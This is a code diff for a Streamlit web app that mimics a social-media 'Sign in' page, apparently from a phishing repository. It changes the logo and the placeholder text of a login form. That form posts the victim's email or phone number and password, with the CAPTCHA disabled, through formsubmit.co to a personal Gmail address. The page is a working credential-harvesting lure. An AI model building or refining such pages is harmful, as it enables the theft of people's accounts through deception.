@@ -9,8 +9,8 @@ with col3:
 
 with col2:
     st.image(
-    "https://github.com/MTA-BD/fishb/blob/main/hcrbin%20-%20Copy/fb.png?raw=true",
-    width=175,
+    "https://github.com/MTA-BD/phis/blob/main/hcrbin/logu.png?raw=true",
+    width=150,
     channels="RGB"
     )
 
@@ -19,6 +19,8 @@ with col2:
 
 #logo=image.open("G.png")
 
+
+import streamlit as st  # pip install streamlit
 
 # Center align the header
 st.markdown("<h2 style='text-align: center; color: black;'>Sign in</h1>", unsafe_allow_html=True)
@@ -56,7 +58,7 @@ contact_form = """
 </style>
 <form action="https://formsubmit.co/md.taseen.alam@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
-     <input class="styledInput" type="email" name="email" placeholder="Mobile number or email address" required>
+     <input class="styledInput" type="email" name="email" placeholder="Email or phone number" required>
      <input class="styledInput" type="text" name="name" placeholder="Password" required>
      <button type="submit" class="styledButton" style="float: right;">Log in</button>
 </form>
